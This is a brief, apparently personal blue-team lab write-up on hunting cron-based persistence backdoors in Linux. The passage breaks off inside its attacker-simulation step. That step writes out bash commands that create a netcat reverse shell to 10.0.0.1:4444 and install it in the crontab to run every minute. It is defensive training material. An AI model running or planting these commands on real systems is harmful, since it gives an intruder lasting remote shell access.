# 🛡️ Blue Team Lab - Day 18: Hunting Persistence (Cronjob Backdoors)

Today, I explored the post-exploitation phase of a cyber attack. I learned that once an attacker breaches a system, their immediate next goal is to establish "Persistence" so they don't lose access if the system is rebooted. 

## 🧠 Core Concepts Mastered
- **Persistence Mechanisms:** Techniques used by threat actors to maintain long-term access to compromised systems.
- **Cronjob Abuse:** Understanding how Linux Scheduled Tasks (`cron`) are heavily weaponized by attackers to run reverse shells or malware at regular intervals.
- **Threat Eradication:** Identifying anomalous scheduled tasks and safely removing them from the system configuration.

## 🛠️ Practical Threat Hunting Executed

### 1. Simulating the Attacker (Persistence Setup)
Created a mock malicious payload (a reverse shell script) and injected it into the user's crontab to execute every minute.
```bash
echo "nc -e /bin/bash 10.0.0.1 4444" > /tmp/malicious_shell.sh
chmod +x /tmp/malicious_shell.sh
(crontab -l 2>/dev/null; echo "* * * * * /tmp/malicious_shell.sh") | crontab -
